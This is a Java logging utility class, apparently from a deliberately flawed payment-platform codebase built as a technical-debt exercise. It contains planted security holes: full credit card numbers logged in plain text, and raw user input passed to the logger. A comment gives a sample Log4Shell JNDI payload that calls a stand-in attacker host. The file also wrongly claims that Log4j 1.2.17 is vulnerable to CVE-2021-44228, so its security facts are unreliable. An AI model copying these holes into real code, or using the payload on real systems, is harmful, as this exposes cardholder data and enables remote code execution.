/**
 * Centralized logging
 * TECH DEBT: Uses Log4j 1.2.17 (LOG4SHELL VULNERABILITY!)
 */

package com.paymentplatform.commons;

import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;

public class LoggingUtils {
    
    // TECH DEBT: Log4j 1.2.17 - CVE-2021-44228 (CRITICAL!)
    private static final Logger logger = Logger.getLogger(LoggingUtils.class);
    
    static {
        // TECH DEBT: Hardcoded log configuration
        PropertyConfigurator.configure("log4j.properties");
    }
    
    /**
     * TECH DEBT: Logs everything to single file, no rotation, disk fills up
     */
    public static void info(String message) {
        logger.info(message);
    }
    
    public static void error(String message, Exception e) {
        logger.error(message, e);
        
        // TECH DEBT: Also prints to console (duplicate logs)
        System.err.println("ERROR: " + message);
        e.printStackTrace();
    }
    
    /**
     * TECH DEBT: Logs sensitive data without redaction
     */
    public static void logPayment(String userId, String cardNumber, double amount) {
        // PCI COMPLIANCE VIOLATION: Logging full credit card numbers!
        logger.info("Payment processed: User=" + userId + 
                    ", Card=" + cardNumber + 
                    ", Amount=" + amount);
    }
    
    /**
     * TECH DEBT: Logs user input directly (Log4Shell exploit vector!)
     */
    public static void logUserInput(String input) {
        // CRITICAL VULNERABILITY: User input goes directly to logger
        // Allows ${jndi:ldap://attacker.com/a} attacks
        logger.info("User input: " + input);
    }
}
